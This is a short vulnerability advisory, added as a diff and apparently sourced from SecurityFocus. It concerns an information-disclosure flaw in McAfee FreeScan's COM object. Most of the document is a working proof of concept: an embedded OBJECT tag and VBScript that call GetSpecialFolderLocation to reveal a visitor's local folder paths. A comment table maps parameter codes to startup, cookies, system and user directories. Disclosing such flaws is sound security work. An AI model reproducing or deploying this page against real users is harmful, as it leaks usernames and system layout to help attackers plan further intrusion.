@@ -1,0 +1,46 @@
+source: http://www.securityfocus.com/bid/10077/info
+
+Reportedly the Mcafee FreeScan 'McFreeScan.CoMcFreeScan.1' COM object is prone to a remote information disclosure vulnerability. This issue is due to a failure of the object to properly validate information access credentials.
+
+Successful exploitation of this issue may provide an attacker with sensitive system information. The provided system information may be used to carry out further attacks against the affected system.
+
+<OBJECT ID="MCFS" WIDTH=0 HEIGHT=0
+CLASSID="CLSID:EF791A6B-FC12-4C68-99EF-FB9E207A39E6"></OBJECT>
+
+<script language=vbscript>
+
+sPath = MCFS.GetSpecialFolderLocation(&H0000)
+
+'Gets the path for the desktop folder.
+
+document.write(sPath)
+
+'The Available parameters for the method and their return values:
+'
+'&H0000=desktop
+'&H0002=%username%start menu/programs
+'&H0005=%username%/my documents
+'&H0006=%username%/favorites
+'&H0007=%username%start menu/programs/startup
+'&H0008=%username%/recent
+'&H0009=%username%/sendto
+'&H0010=%username%/desktop
+'&H0013=%username%/nethood
+'&H0014=%windir%/fonts
+'&H0015=%username%/templates
+'&H0016=all users/start menu
+'&H0017=all users/start menu/programs
+'&H0018=all users/start menu/programs/startup
+'&H0019=all users/desktop
+'&H0020=%username%/Local Settings/Temporary Internet Files
+'&H0021=%username%/cookies
+'&H0022=%username%/local settings/history
+'&H0023=All Users/Application Data
+'&H0024=%windir%
+'&H0025=%windir%/system32
+'&H0026=%programfiles%
+'&H0027=%username%/My Documents/My Pictures
+'&H0028=%username%
+'&H0029=%windir%
+
+</script>
